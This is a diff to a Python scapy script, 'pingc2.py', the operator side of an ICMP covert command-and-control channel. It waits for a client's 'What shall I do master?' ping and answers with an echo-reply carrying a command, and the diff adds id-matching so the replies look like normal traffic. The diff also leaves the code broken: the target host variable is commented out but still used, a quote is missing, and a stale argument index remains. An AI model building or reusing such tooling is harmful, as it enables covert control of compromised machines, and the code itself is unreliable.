@@ -10,15 +10,15 @@ import sys
 from scapy.all import *
 
 def main(argv):
-	if len(argv) < 2:
+	if len(argv) < 1:
                 print "----------------------------"
                 print "PingC2 Usage"
-                print " ./pingc2.py <client IP> <command>"
+                print " ./pingc2.py <command>"
                 print "----------------------------"
                 exit()
 	
 	conf.verb = 0
-	host = sys.argv[1]
+	#host = sys.argv[1]
 	count = 1
 	filter = "icmp and host " + host
 	print "[*] Sniffing with filter (%s) for %d bytes" % (filter, int(count))
@@ -29,10 +29,12 @@ def main(argv):
 			p.show2()
 			request = p['Raw'].load
 			checksum = p['ICMP'].chksum
+			ip_id = p['IP'].id
+			icmp_id = p[ICMP'].id
 			print "[*] Request checksum: (%s)" % checksum
 			print "[*] Request: " + request
 			if request == 'What shall I do master?':
-				resp = IP(dst=host)/ICMP(type="echo-reply")/sys.argv[2]
+				resp = IP(dst=host,id=ip_id)/ICMP(type="echo-reply",id=icmp_id)/sys.argv[1]
 				print "[*] Response sent: " + sys.argv[2]
 				resp.show2()
 				send(resp)
